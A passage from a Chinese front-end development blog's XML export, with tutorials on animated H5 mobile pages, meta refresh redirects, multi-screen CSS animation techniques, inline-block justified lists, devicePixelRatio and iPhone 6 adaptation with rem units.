 重力陀螺仪&emsp;&emsp;想让页面更有层次感，不妨让设计提供一些碎片元素，例如彩花，星星之类，然后把它们单独切出来放画面前景，使用陀螺仪伴随着手机运动碎片也跟着运动，多么好玩！&emsp;&emsp;这里提供一个工具可以轻松实现陀螺仪重力效果的：parallax.js&emsp;&emsp;用法简单，定义一个parallax-obj的父类，把需要动的元素加上layer的类，然后设置动的范围data-depth：（5） 背景音乐&amp;音效&emsp;&emsp;H5页面要炫酷，画面生动还是不够的，一定要配合生动的音乐。因此可以主动跟设计或产品沟通，让他们可以提供音乐资源，分分钟导致UV猛涨有木有！当然，有了音乐，前端也不是直接引用的，还是有点要求：1.音乐不宜过长，30s为佳，而且音乐要加上渐现渐隐效果，方便循环播放；2.音乐体积要小，音质和流量，在手机上还是优先考虑流量吧。一般背景音乐体积可以接受的范围是200K以下，若太大，可以使用格式工厂等软件，降低它的比特率和声道来改变体积。接着，只需要简单引用：&emsp;&emsp;这里有个问题，IOS是不能自动播放音乐的，一定要触发一个用户交互事件，例如点击。&emsp;&emsp;但是有一种hack的方法可以让IOS微信侧页面自动播放（SAFARI依旧无效）：&emsp;&emsp;通过new一张图片，监听一张图片的onload事件，结束后回调执行音频播放audio.play()即可，原理估计是动了dom结构，相当于执行了一次交互。（有人也用过createEvent模拟，原理也是动了dom。）&emsp;&emsp;因此，记得暴露一个音乐关闭/打开的按钮，不然肯定被用户骂死。&nbsp;（6）有趣的loadingLoading页还是要有的，万一用户网速慢呢?&emsp;&emsp;以上做了那么多事，如果没有资源加载都是玩不来的，因此还需要一个loading的支持。一般情况下页面体积大于3m则要加上loading页。&nbsp;然而loading还是可以做得很有趣的，一般的做法是：1.引入品牌，例如APP宣传页;2.引入有趣动画，放一个贱贱的人物跳舞给你看；3.一切从简，用CSS3简单动画。====最后总结====最后，给一个例子结尾吧。&emsp;&emsp;这是空间5.0预约页第二版，使用了以上的若干方法论，例如loading动画，CSS3动画，SVG星空连线，首屏星球重力感应，音乐（这里使用开启按钮后播放）等等。（由于活动已结束，很多运营处都被删掉从简了，忽略那些细节）&emsp;&emsp;当然，真正要做到高效制作动态H5页面，还是靠积累，因此平时做好的细节动画自己都积累起来，下次分分钟就能用得上。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>html5移动页面</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用meta实现页面的定时刷新或跳转]]></title>
    <url>%2F2015%2F07%2F15%2F%E4%BD%BF%E7%94%A8meta%E5%AE%9E%E7%8E%B0%E9%A1%B5%E9%9D%A2%E7%9A%84%E5%AE%9A%E6%97%B6%E5%88%B7%E6%96%B0%E6%88%96%E8%B7%B3%E8%BD%AC%2F</url>
    <content type="text"><![CDATA[一、meta源信息功能之页面定时跳转与刷新&emsp;&emsp;几乎所有的网页头部都有&lt;meta&gt;源信息。除了我们常用的定义编码、关键字(name=”keywords”)、描述(name=”description”)(for SEO)，还可以定义视区大小、缩放比例等(for 移动端)，如下：1&lt;meta name="viewport" content="width=device-width,initial-scale=1.0"&gt;以及，定义网页的过期时间，Cookie的过期时间等等。&emsp;&emsp;文本要介绍的内容，科科，跟上面都没关系。哦，抱歉，都有关系，只是名称我故意没提到。主角嘛，总要最后闪亮登场！&emsp;&emsp;就是我们网页平时跳转，还可以使用&lt;meta&gt;实现，下面几个典型代码示例：http-equiv="refresh" content="5">```123这个表示当前页面每5秒钟刷一下，刷一下~2. ```&lt;meta http-equiv=&quot;refresh&quot; content=&quot;2; url=&apos;/&apos;&quot;&gt;这个表示当前页面2秒后跳到首页~&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=&#39;http://www.qq.com/&#39;&quot;&gt;页面直接跳转到腾讯网~所以，当我们下次遇到“登录成功，正在跳转到您之前访问页面……”的时候，可以使用&lt;meta&gt;的这个refresh刷新，跳转功能，可以说是成本最低的。您可以狠狠地点击这里：meta与当前页面定时刷新Demo上面Demo效果就是上面第1个示例代码效果。根据我的测试，此特性包括IE7在内的浏览器都是支持的。二、问题来了：为何meta跳转不火呢？&emsp;&emsp;大家可以看到，meta跳转，使用方便，不用写JS，不用会后台代码，定时跳转刷新什么的玩得照样很溜，而且兼容性好，为啥总感觉不温不火，很少看见有人提及呢？&emsp;&emsp;新晋的小伙伴不知有没有听过这么一个词，叫做“万恶的IE6年代”。&emsp;&emsp;据说，当年，这一批老旧的浏览器，问题很多，其中就有对meta2个小小的不友好。我也是听说，不一定准确。坊间是这么传闻的：时间设为0的跳转，有时候页面会闪一下；跳转到其他页面，浏览器后退按钮是不能用的；但是啊，现在是什么年代啊，监狱风云都拍到第二季了，这些老问题，我觉得就可以忽略不计了。&emsp;&emsp;不妨大胆试试meta跳转，好好利用下浏览器的原生特性，说不定就会发现比什么JS跳转之流用得更开心。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>meta定时</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多屏复杂动画CSS技巧三则]]></title>
    <url>%2F2015%2F07%2F15%2F%E5%A4%9A%E5%B1%8F%E5%A4%8D%E6%9D%82%E5%8A%A8%E7%94%BBcss%E6%8A%80%E5%B7%A7%E4%B8%89%E5%88%99%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;当下CSS3应用已经相当广泛，其中重要成员之一就是CSS3动画。并且，随着CSS动画的逐渐深入与普及，更复杂与细腻的动画场景也如雨后春笋般破土而出。例如「企业QQ-新年祝福」活动：&emsp;&emsp;感谢shirley帮忙录制上面的视频，虽然视频内容是手机上的显示效果，但是，这个“企业新年祝福活动”原本只针对桌面端，移动端是后来辅助增强（增加了相当于活动页面UV 5.7%的点击）。而目前大多数类似页面只针对移动端，例如其他同事实现的QQ空间5.0预约页第二版：扫码(需登录)或者链接二选一：访问demo戳这里&emsp;&emsp;因此，需要多一点适配的技巧。但是，对于动画效果实现，其实都是一脉相承的，最终的实现需要很多点滴积累，我这里讲三个部分同学可能不知道的相关CSS技巧。注：示例代码的私有前缀均省略，大家自行脑补技巧一、使用animation-play-state控制每屏动画播放1. 类名active与动画触发首先，使用active触发每一屏的动画，几乎已经约定俗成，应该也建议成为默认的行业规范。一般做法是，当对应一屏内容进入的时候，使用JS给容器添加类名active:12345如果你做的动画逼格较高，希望每次浏览这一屏内容的时候，动画都走一遍，可以使用reflow重新触发一下`animation`:```javascriptcontainer.classList.remove(&quot;active&quot;);container.offsetWidth = container.offsetWidth;container.classList.add(&quot;active&quot;);2. 类名active与动画控制技巧&emsp;&emsp;如何具体控制动画的播放呢？我们通常第一反应是使用下面的方法实现，动画的完整CSS代码在active状态下呈现，如：123456789.element1 &#123; /* 尺寸与定位 */ &#125;.element2 &#123; /* 尺寸与定位 */ &#125;.element3 &#123; /* 尺寸与定位 */ &#125;....active .element1 &#123; animate: name1 1s; &#125;.active .element2 &#123; animate: name2 1s; &#125;.active .element3 &#123; animate: name2 1s; &#125;...&emsp;&emsp;从实现和功能上将，上面方法是很不错的，通俗易懂，不易犯错。不过我个人更喜欢使用配合CSS3的animation-play-state属性对每屏动画进行控制，实现如下：动画相关CSS代码直接写在元素上：&#123;尺寸与定位 */ animate: name1 1s; &#125;123.element2 &#123; /* 尺寸与定位 */ animate: name2 1s; &#125;.element3 &#123; /* 尺寸与定位 */ animate: name3 1s; &#125;...创建一个类名，如.animate，凡是使用到了animation动画的元素都添加这个类名；如下CSS代码：123456.animate &#123; animation-play-state: paused;&#125;.active .animate &#123; animation-play-state: running;&#125;之所以个人更喜欢后面的方法，是因为有一种“无侵入”的感觉，代码层次清晰，控制关系明确。有利于后期的维护与扩展。然而，使用animation-play-state还是有些需要注意的，对于IE10/IE11浏览器，animation-play-state是不能简写的。如：1.element &#123; animate: shake 4s 2s both infinite paused; &#125;只会让整个CSS声明挂掉的！如下写法支持：1234.element &#123; animate: shake 4s 2s both infinite; animation-play-state: paused;&#125;有人可能要奇怪了，怎么突然IE浏览器乱入了？ 首先，我们不能无视主流手机之Windows Phone. 其次，帅气的翻屏动画并不是移动端专有，桌面端也适用。稍稍用力，桌面移动全适配，何乐而不为！技巧二、不同状态下的连续动画有时候，动画可能不是一波流，分状态。例如，我们的小火箭，先是淡出动画，然后无限上下悬浮。怎么实现呢？关键点就是动画分解与延时。&emsp;&emsp;据我所知，没办法只使用一个keyframes关键帧声明就实现这个效果，因为，这里有动画状态的变化：一个只执行一次的动画和一个无限循环动画。怎么办？我们可以将动画分解，写2个animation keyframes动画关键帧描述。12@keyframes fadeIn &#123; /* ... */ &#125;@keyframes float &#123; /* ... */ &#125;然后，再分别应用这些关键帧动画。如何应用呢？有2个小技巧：1. 逗号与多animation动画值如下：1234&lt;div class="element"&gt;小火箭&lt;/div&gt;.element &#123; animation: fadeIn 1s, float .5s 1s infinite; &#125;/* 我淡出, 需要1秒；我1秒后开始无限漂浮 */&emsp;&emsp;其中float .5s 1s infinite这里的1s就是无限漂浮动画执行延迟的时间，于是，两个动画完美配合，感觉就像是一个动画。实际上，就是一个动画，所有CSS3 animation动画走同一个UI线程，这也是为何推荐使用CSS实现动画效果的原因。此写法没有兼容性问题，大家可以开开心心地使用。2. 标签嵌套与独立动画我们还可以通过嵌套标签的形式实现连续动画，例如：123456&lt;div class="element-wrap"&gt;&lt;div class="element"&gt;小火箭&lt;/div&gt;&lt;/div&gt;.element-wrap &#123; animation: fadeIn 1s; &#125;/* 我淡出, 需要1秒 */.element &#123; animation: float .5s 1s infinite; &#125;/* 我1秒后开始无限漂浮 */&emsp;&emsp;有人可能会奇怪了。animation本身就支持多动画并行，你还搞个标签嵌套，没有任何使用的理由啊！没错，单纯看我们这个例子，确实是这样。但是：① 提取公用动画&emsp;&emsp;这类多屏动画是有N多元素同时执行不同的动画。比方说，火箭是淡出，然后上下漂浮；火箭的火焰是淡出，然后大小变化；黑洞是淡出，然后左右随波。你如何实现？如果纯粹借助animation语法，应该是：123456.element1 &#123; animation: fadeIn 1s, float .5s 1s infinite; &#125;/* 我淡出, 需要1秒；我1秒后开始无限漂浮 */.element2 &#123; animation: fadeIn 1s, size .5s 1s infinite; &#125;/* 我淡出, 需要1秒；我1秒后开始大小变化 */.element3 &#123; animation: fadeIn 1s, move .5s 1s infinite; &#125;/* 我淡出, 需要1秒；我1秒后开始左右移动 */可以看到，淡出是公用的动画效果，我们可以借助嵌套标签，实现公用语法的合并，方面后期维护：12345678.element-wrap &#123; animation: fadeIn 1s; &#125;/* 大家都1秒淡出 */.element1 &#123; animation: float .5s 1s infinite; &#125;/* 我1秒后无限漂浮 */.element2 &#123; animation: size .5s 1s infinite; &#125;/* 我1秒后忽大忽小 */.element3 &#123; animation: move .5s 1s infinite; &#125;/* 我1秒后左右移动 */②避免变换冲突&emsp;&emsp;有个元素动画是边360度旋转、边放大(从0放大到100%)，像这种具有典型特征的动画我们显然要独立提取与公用的：12@keyframes spin &#123; /* transform: rotate... */ &#125;@keyframes zoomIn &#123; /* transform: scale... */ &#125;好了，现在问题来了，变放大边旋转：12.element &#123; animation: spin 1s, zoomIn 1s; &#125;/* 旋转：啊，完蛋啦，我被放大覆盖啦！ */&emsp;&emsp;由于都是使用transform, 发生了残忍的覆盖。当然，有好事的人会说，你使用zoom不就好了！确实，如果只是移动端，使用zoom确实棒棒哒！但是，我们这个企业活动，PC是主战场，因此，FireFox浏览器（FF不识zoom）是不能无视的。怎么办？重新建一个名为spinZoomIn的动画关键帧描述还是？对啊，你直接外面套一层标签不就万事大吉了12.element-wrap &#123; animation: spin 1s; &#125; /* 我转转转 */.element &#123; animation: zoomIn 1s; &#125; /* 我大大大 */技巧三、无侵入定位和居中定位准则1. 这里的“无侵入定位”指不受animation影响的元素定位，包含两部分：一是不使用keyframes关键帧决定初始位置；二是不要使用keyframes中出现的属性定位。①. 不使用keyframes决定初始位置&emsp;&emsp;应该都知道，CSS3 animation的fill-mode可以决定元素动画结束前后的位置，也就是也具有定位的作用。此时，可能就会有小伙伴，故作聪明，利用animation keyframes 0% {}或form {}去做定位，貌似，还省了写代码。看上去很赞，实际上狭隘了，这对于对animation支持不佳或不支持的浏览器实际上是不友好的，例如Android2.3不支持animation-fill-mode, IE6-IE9不支持CSS3 animation，于是乎，当遭遇这些浏览器的时候，页面动画元素的布局实际上是毁掉的。所以，这些动画元素定位的时候，需要使用“无侵入定位”，也就是，就算页面没有animation, 我也是个“标致人儿”。②. 不使用keyframes中出现的属性定位&emsp;&emsp;举个例子，有个球，正好定位在模块的中心，同时有个无限旋转效果。使用transform: translate(-50%,-50%)居中定位再合适不过了，不用我心里难受，于是，使用了transform定位。此时，冲突发生，旋转动画也是需要transform变换的。1234@keyframes spin &#123; 0% &#123; transform: rotate(0); &#125; 100% &#123; transform: rotate(360deg); &#125;&#125;要么使用业界约定俗成spin覆盖，要么另起炉灶没法重用：1234@keyframes spin-trans &#123; 0% &#123; transform: rotate(0) translate(-50%,-50%); &#125; 100% &#123; transform: rotate(360deg) translate(-50%,-50%); &#125;&#125;显然，都是不合适的。建议使用传统left/top/margin进行定位，与transform变换动画“无侵入”。2. 这里的“居中定位准则”包含两部分：一是元素定位在容器中间位置；二是元素的定位方式为居中定位。①. 元素定位在容器中间容器以及容器内的动画元素可以看成是一个动画模块，为了这个模块可以轻松驾驭水平布局和垂直局部，里面的动画元素形成的整体一定要在容器的中间，不要被设计稿或周围环境影响。举个简单例子，本文一开始展示的「企业QQ-新年祝福」活动。&emsp;&emsp;企业产品用户特点比较鲜明：一是访问主要集中在桌面端，二是有70~80%用户使用的是webkit/blink内核浏览器。所以，大家可以理解为何设计稿明明针对桌面端，却有如此多细腻的动画设计了。&emsp;&emsp;故事是这样的，桌面版做好了，1024-1224自适应，IE7以上都兼容（无侵入定位准则）（除了没动画），好棒!此时负责视觉的晓玲同学希望也能适配移动端，可以增加一定的传播，我觉得挺好的，于是，决定通过技术手段，让活动页面能游走于桌面和移动之间，同时，保证各种动画效果棒棒哒！&emsp;&emsp;结果，发现自己留了一个坑，拿第2屏举例，桌面版，长这样，右侧动画内容并不是完全居中的：本着高度还原设计稿的原则，所有动画元素都经过测量定位，按照PSD中的参考线左上角(left/top)，结果整体左侧冒出60像素：&emsp;&emsp;于是，问题来了，当移动端做响应式适配时候，由于容器内的动画元素不是居中的，所以——&emsp;后来，进行了修改，内部动画元素整体居中，外部容器桌面端做左侧60像素偏移，于是，适配移动端时候，就正好是居中的啦。②. 定位方式为居中定位所谓“居中定位”是相对“传统定位”而言的。Web页面中的模块、文字什么的默认都是相对于左上角堆砌的，所以，很自然地，我们在重构页面，做布局，写交互效果的时候，也都是相对左上角定位。活用元素本身的定位特性，这是很赞的也推荐这么做！但是，如果你和多元素CSS动画打交道，可能就需要改变下惯性思维了，很重要的一点就是“从以左上角为参考点变成以中心点为参考点”。&emsp;&emsp;我们在实现多元素动画效果时候，会出现两类角色：一是容器；二是容器里面诸多动画元素。其中，对于容器元素，尤其在做移动端产品时候，我们很自然会让其居中定位：1234.container &#123; position: absolute; left: 50%; top: 50%; transform: translate3d(-50%, -50%, 0);&#125;这样，各种尺寸的手机，我们都能让其居中显示（大尺寸可能需要一定的缩放）。但是，我们有没有想过让容器里面的诸多动画元素也居中定位显示呢？用代码来解释就是从左上角定位（或右上角定位）：123.example &#123; position: absolute; left: 100px; top: 100px;&#125;变成中心点定位+ margin偏移：1234.example &#123; position: absolute; left: 50%; top: 50%; margin-left: -100px; margin-top: -100px;&#125;有同学可能要疑问了，why? 前面一步到位不挺好的，后面这样分两步走岂不是多余？&emsp;在大多数情况下，我们的应用场景比较单一，或只需要玩转移动端，或只需要驾驭桌面端，此时，上面两种定位的优劣是看不出来的。但是，遇到一些复杂的应用场景，尤其涉及到容器尺寸或定位方式改变的时候，后面的定位优势就可以看出来。比方说一开始提到的qzone5.0的例子，如果我们把容器宽度加大（实际是不会的，示意目的），如414像素：会发现，宇航员和飞船在小行星之外了，也就是动画元素不是聚拢状态了。所以，大家看出居中定位的优势来了没有：动画元素之间的位置关系不受容器尺寸影响；居中特性遭遇多场景时适应性更强；还是拿去年年底做的「企业QQ-新年祝福」活动举例，第8屏：&emsp;&emsp;其中，中间的“王强”和“马老板”这些数据有可能是没有的，也就是很有可能这一屏只有文字和宇航员，但同时还要保持整体垂直居中。很显然，宇航员和火箭所在的容器不能是绝对定位，否则脱离文档流，不能和上面元素保持合适垂直间距同时垂直居中。我们仍然有2种实现方法：固定容器宽度，例如350像素宽，然后，里面左上角定位等，本身margin: auto水平居中；容器不设定width大小，直接里面动画元素居中定位；方法1问题在于：第7屏是类似结构，但是其动画容器宽度不是350像素，没法重用；当在iPhone5/iPhone5s下，屏幕320像素宽(小于350像素)，由于左上角定位，因此，整体不是居中效果；而方法2，屏幕尺寸再小，也是居中的，只不过两侧有所剪裁。最终，移动端适配时候，我们不必关心定位问题，只要合适缩放就可以了 ：以上两屏示意demo戳这里结语&emsp;&emsp;首先，大家要明白，本文所展示的三个技术技巧属于个人经验建议，注意，是建议。里面所提到的所有解决方法都有更加直观、通俗的实现，对于大多数的产品而言，技术的价值体现已经足够；同时应用场景千千万，没有什么一方通行的方法，例如居中定位准则，有时候，可能就是需要非居中定位。&emsp;&emsp;但是，作为一个有技术追求的技术从业人员，对技术的精益求精一定是有价值的，无论是对自己，还是公司。有人可能会反驳，我们这个项目明明只会针对移动端，你还花心思考虑低配的事情，岂不是白白浪费时间和人力成本。古人有云：“不以善小而不为”，这种去粗取精的小经验虽然看上去没什么实质性成长，对眼前项目也没多少价值体现，但是积累足够多，会产生质变的，填坑的事情少了，工作也更轻松与快乐，对公司产生的价值也更大。&emsp;&emsp;高瞻远瞩积跬步，登峰造极至千里。&emsp;&emsp;好了，以上就是自己对于多屏CSS动画方面的一些技巧体会，希望可以对大家的学习有所帮助。当然，资历有限，要是文中有什么表述不准确的地方，欢迎指正；也欢迎针锋相对的讨论，共同成长。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>多屏复杂动画</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[inline-block + justify实现列表两端对齐]]></title>
    <url>%2F2015%2F07%2F15%2Finline-block-justify%E5%AE%9E%E7%8E%B0%E5%88%97%E8%A1%A8%E4%B8%A4%E7%AB%AF%E5%AF%B9%E9%BD%90%2F</url>
    <content type="text"><![CDATA[适用条件：1、一行的li间距宽度 小于两个li的宽度之和；2、li个数刚好满行条件1大部分都能满足的，所以主要就是刚好满行的情况。相关代码片段Css代码1234567891011121314151617181920212223ul &#123; text-align:justify; text-justify:distribute; font-size:0; letter-spacing:-4px;/*解决inline-block间隙表现不一致 bug*/&#125;ul li &#123; display:inline-block; *display:inline; *zoom:1; font-size:12px; letter-spacing:0; vertical-align:top;&#125;ul li.justify_fix &#123; width:100%; height:0; line-height:0; font-size:0; overflow:hidden; margin:0; padding:0;&#125;html结构如下123456789101112131415161718&lt;div class="container"&gt;&lt;ul&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;!-- 必须空出一个li 来fix bug --&gt;&lt;li class="justify_fix"&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>inline-block，justify</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设备像素比devicePixelRatio简单介绍]]></title>
    <url>%2F2015%2F07%2F15%2F%E8%AE%BE%E5%A4%87%E5%83%8F%E7%B4%A0%E6%AF%94devicepixelratio%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;本文所说devicePixelRatio其实指的是window.devicePixelRatio, 被所有WebKit浏览器以及Opera所支持，随着显示器的发展，这个属性也慢慢登上了前端技术的舞台。&emsp;&emsp;本文内容大部分属于翻译性质内容，因此，会不那么通俗易懂。不过，你是做手机开发的，或是有意向的，本文的内容如果细细读来，还是有些收获的。一、定义定义如下：window.devicePixelRatio是设备上物理像素和设备独立像素(device-independent pixels (dips))的比例。公式表示就是：window.devicePixelRatio = 物理像素 / dipsdip或dp,（device independent pixels，设备独立像素）与屏幕密度有关。dip可以用来辅助区分视网膜设备还是非视网膜设备。所有非视网膜屏幕的iphone在垂直的时候，宽度为320物理像素。当你使用&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;的时候，会设置视窗布局宽度（不同于视觉区域宽度，不放大显示情况下，两者大小一致，见下图）为320px, 于是，页面很自然地覆盖在屏幕上。这样，非视网膜屏幕的iphone上，屏幕物理像素320像素，独立像素也是320像素，因此，window.devicePixelRatio等于1.而对于视网膜屏幕的iphone，如iphone4s, 纵向显示的时候，屏幕物理像素640像素。同样，当用户设置&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;的时候，其视区宽度并不是640像素，而是320像素，这是为了有更好的阅读体验 – 更合适的文字大小。这样，在视网膜屏幕的iphone上，屏幕物理像素640像素，独立像素还是320像素，因此，window.devicePixelRatio等于2.二、浏览器支持IE以及FireFox压根不支持。可能接下来的版本会支持。Opera桌面浏览器时，即使是视网膜设备，返回的值也是1而不是2. 不过，这个bug在后续的版本中会修复的。Opera Mobile 10不支持，不过Opera Mobile 12正确支持。UC总是显示1，不过其viewport属性有些让人费解。只有最近的Chrome浏览器才能正确实现该属性。Chrome19返回不准确的1, Chrome22可以正确返回2.MeeGo WebKit (Nokia N9/N950)就吓人了：当你应用了meta viewport时候（类似&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;），值会从1变成1.5!真是喜忧参半。好的是Safari, Android WebKit, Chrome 22+(Android), Opera Mobile, BlackBerry WebKit, QQ, Palm WebKit, 及Dolfin都能正确实现该属性。当然，大部分这些浏览器仍然运行在devicePixelRatio值应该为1的系统上，当它们移动到视网膜类似设备时候，可能就会遇到问题。两个注意事项：MeeGo WebKit meta viewport应用时改变值的做法是大错特错的。设备像素比应该是不变的，不仅物理像素值，设备独立像素也是如此。二是，一些浏览器习惯在meta viewport应用时改变各种东西（三星的Dolfin就是代表），这完全就是在瞎搞。唯一的变化应该是布局视图的尺寸。如果浏览器变了其他什么都是，那都是很挫的。实际测试您可以狠狠地点击这里：window.devicePixelRatio值支持与否测试demo例如，我现在的FireFox桌面版(14.0.1)弹出的就是undefined, 如下图：Chrome下是认识这个属性的，在我机子上弹出的是1, 如下图：其他一些系统、设备1. iOS类似的，无视网膜设备devicePixelRatio值为1，视网膜设备为2. 因为实际的像素个数是双倍。不过，iphone似乎不愿意改变大家都熟知习惯的320像素宽度布局，没有把设备宽度一下子变成640像素，因此，dips宽度依然是320, 于是devicePixelRatio就是640/320 = 2.iOS上的情况要相对简单些，除了1就是2. 在其他平台也基本上很简单，因为一般分辨率都比较挫，devicePixelRatio都是1.2. Android据我所知，谷歌的Nexus One是第一个使用dips的，比iphone还早。同时Galaxy Nexus以及Galaxy Note都是类运动视网膜显示器。近距离探究这三个设备应该会有所收获。Nexus One分辨率是480*800, 为了最优的页面浏览，Android WebKit团队决定纵向手持时候的宽度依然是320像素，因此，devicePixelRatio值为480/320 = 1.5.在同一手机上，Opera Mobile有相同的结论，dips为320宽，devicePixelRatio也是1.5 .顺便提一下，BlackBerry Torch 9810(OS7)物理像素同样480像素，BlackBerry WebKit团队决定坚持devicePixelRatio为1. 这可能是更不错的做法，在Torch显示器上480px宽度站点或多或少有些难以阅读。Galaxy Nexus有像素的提升，为720×1200. Android团队决定提高dips层的宽度到360像素。从而使devicePixelRatio为720/360 = 2. Chrome团队决定跟进，就如腾讯QQ浏览器所做的那样。然而，Opera，坚持自我，dips宽度为320px, 于是devicePixelRatio为720/320 = 2.25. 不过似乎还与zoom缩放层级有关。Galaxy Note物理像素为800×1200. 这里所有浏览器都决定使用与Galaxy Nexus一样的比率：Android WebKit, Chrome, 以及QQ都是2，也就意味着其dips宽度为400px. 然而，Opera依然一意孤行2.25, 于是其dips宽度值有些怪怪的: 356px.Android标准似乎不严格，于是自家人玩自家人的游戏，对于开发者而言，可能又会面临苦逼~~3. 视网膜MacBook新的MacBook采用视网膜显示屏，其devicePixelRatio是（如果不出意外）2. 视网膜MacBook的物理像素是2800×1800，而显示出分辨率为1400×900，如果把分辨率作为dips层，则devicePixelRatio为2应该是无误的。需要指出的是，如果你把分辨率改成1920×1200，devicePixelRatio依然是2. 严格来讲，这是不准确的，应该是1.5, 然而你也可以说MacBook的分辨率不同于dips层，这种情况下devicePixelRatio在台式机/笔记本下的定义就不一样（哪一个？不知道。）。在任何情况下，根据苹果的规范做法，devicePixelRatio值只可能是1或者2. 如果你看到2，你要提供视网膜优化显示图片，如果是1，使用正常的图片——（这里内容其实属于视网膜站点的开发内容）。四、其他相关属性当页面设置了&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;时候，document.documentElement.clientWidth在大部分浏览器下，得到的是布局视区的宽度，等同于dips的宽度。对于screen.width的值：在iOS视网膜设备上，screen.width返回dips宽。因此，在竖着显示的时候，视网膜显示屏的ipad和非视网膜显示屏的ipad返回的都是768.在上面提到的三个Android设备上，screen.width返回的是物理像素宽度，分别480, 720, 和800. 该设备上的所有浏览器都是该值。Vasilis有一个很好的理论：苹果像素，因为它想使显示更清晰，更流畅，而Android厂商增加的像素在屏幕上塞进更多的东西。它解释了为什么苹果强调非视网膜视网膜的连续性，而Android集中在原始像素数。Nokia Lumia Windows Phone上的IE9 screen.width的值与Android设备一样，返回的是物理像素。而且其不支持devicePixelRatio. 因此，我们无法从中看出其对待像素的态度是如何的。小小结论devicePixelRatio在大多数浏览器是值得信赖的。在iOS设备，screen.width乘以devicePixelRatio得到的是物理像素值。在Android以及Windows Phone设备，screen.width除以devicePixelRatio得到的是设备独立像素(dips)值。注：本文的DIPs切勿和DPI搞混了！DPI指每英寸点的个数，本文的DIPs指设备独立像素。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>devicePixelRatio</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端H5页面之iphone6的适配]]></title>
    <url>%2F2015%2F07%2F15%2F%E7%A7%BB%E5%8A%A8%E7%AB%AFh5%E9%A1%B5%E9%9D%A2%E4%B9%8Biphone6%E7%9A%84%E9%80%82%E9%85%8D%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;iphone6 及 iphone 6 plus 已经出来一段时间了。很多移动端网站，以前写死body 为320px的，现在估计也忙着做适配了。&emsp;&emsp;大屏幕手机其实一直有，只是以前大家没怎么重视，移动端的H5页面大部分都以320px为基准宽度进行布局，那些大屏屌丝android用户也懒得去理，而现在iphone也搞起多屏幕，老板们重视程度就不一样了。&emsp;&emsp;回归正题，兼容iphone各版本机型最佳的方式就是自适应。1、viewport 简单粗暴的方式：1&lt;meta name="viewport" content="width=320,maximum-scale=1.3,user-scalable=no"&gt;直接设置viewport为320px的1.3倍，将页面放大1.3倍。为什么是1.3？&emsp;&emsp;目前大部分页面都是以320px为基准的布局，而iphone6的宽度比是375/320 = 1.171875，iphone6+则是 414/320 = 1.29375那么以1.29倍也就约等于1.3了。2、ip6+ 的CSS media query1@media (min-device-width : 375px) and (max-device-width : 667px) and (-webkit-min-device-pixel-ratio : 2)&#123; /*iphone 6*/ &#125; @media (min-device-width : 414px) and (max-device-width : 736px) and (-webkit-min-device-pixel-ratio : 3)&#123; /*iphone 6 plus*/ &#125;PS: 也可以直接使用实际的device-width：如device-width : 375px在原有页面的基础上，再针对相应的屏幕大小单独写样式做适配。3、REM布局&emsp;&emsp;REM是CSS3新增的一种单位，并且移动端的支持度很高，android2.x+，ios5+ 都支持。REM是相对于dom结构的根元素来设置大小，也就是html这个元素。相较于em单位，rem使用上更容易理解及运用。REM与PX的换算可以查看网址：https://offroadcode.com/prototypes/rem-calculator/假设，html我们设置font-size:12px; 也就是说12px相对于1rem，那么18px也就是 18/12 = 1.5rem。那么我们以320px的设计布局为基准，将html设置为font-size:100px，即100px = 1rem。(设置100px是为了方便计算)那么可以将大部分px单位除以100就可以直接改成rem单位了。REM如何做响应式布局？1、如果仅仅是适配ip6+设备，那么使用media query就行。伪代码如下：1234567891011/*320px布局*/html&#123;font-size: 100px;&#125;body&#123;font-size: 0.14rem /*实际相当于14px*/&#125;/* iphone 6 */@media (min-device-width : 375px) and (max-device-width : 667px) and (-webkit-min-device-pixel-ratio : 2)&#123;html&#123;font-size: 117.1875px;&#125;&#125;/* iphone6 plus */@media (min-device-width : 414px) and (max-device-width : 736px) and (-webkit-min-device-pixel-ratio : 3)&#123;html&#123;font-size: 129.375px;&#125;&#125;这样，在ip6下，也就将页面内的元素放大了1.17倍，ip6+下也就是放大了1.29倍。2、如果是完全自适应，那么可以通过JS来控制。12345678910111213(function (doc, win) &#123;var docEl = doc.documentElement,resizeEvt = 'orientationchange' in window ? 'orientationchange' : 'resize',recalc = function () &#123;var clientWidth = docEl.clientWidth;if (!clientWidth) return;docEl.style.fontSize = 100 * (clientWidth / 320) + 'px';&#125;;// Abort if browser does not support addEventListenerif (!doc.addEventListener) return;win.addEventListener(resizeEvt, recalc, false);doc.addEventListener('DOMContentLoaded', recalc, false);&#125;)(document, 